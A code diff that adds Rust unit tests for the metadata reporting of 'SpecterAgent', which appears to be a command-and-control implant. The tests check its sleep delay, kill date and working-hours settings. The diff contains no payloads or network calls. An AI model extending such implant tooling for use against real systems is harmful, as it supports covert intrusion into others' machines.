@@ -291,6 +291,35 @@ mod tests {
     }
 
     #[test]
+    fn collect_metadata_converts_sleep_delay_ms_to_seconds() {
+        let config = SpecterConfig { sleep_delay_ms: 10_000, ..Default::default() };
+        let agent = SpecterAgent::new(config).expect("agent creation");
+        let metadata = agent.collect_metadata();
+        assert_eq!(metadata.sleep_delay, 10, "10000 ms should be reported as 10 seconds");
+    }
+
+    #[test]
+    fn collect_metadata_includes_kill_date_from_config() {
+        let config = SpecterConfig { kill_date: Some(1_893_456_000), ..Default::default() };
+        let agent = SpecterAgent::new(config).expect("agent creation");
+        let metadata = agent.collect_metadata();
+        assert_eq!(metadata.kill_date, 1_893_456_000);
+    }
+
+    #[test]
+    fn collect_metadata_includes_working_hours_from_config() {
+        let wh = ((1_u32 << 22)
+            | ((9_u32 & 0b01_1111) << 17)
+            | ((0_u32 & 0b11_1111) << 11)
+            | ((17_u32 & 0b01_1111) << 6)
+            | (0_u32 & 0b11_1111)) as i32;
+        let config = SpecterConfig { working_hours: Some(wh), ..Default::default() };
+        let agent = SpecterAgent::new(config).expect("agent creation");
+        let metadata = agent.collect_metadata();
+        assert_eq!(metadata.working_hours, wh);
+    }
+
+    #[test]
     fn ctr_accessor_reflects_current_offset() {
         let mut agent = SpecterAgent::new(SpecterConfig::default()).expect("agent");
         agent.ctr_offset = 7;
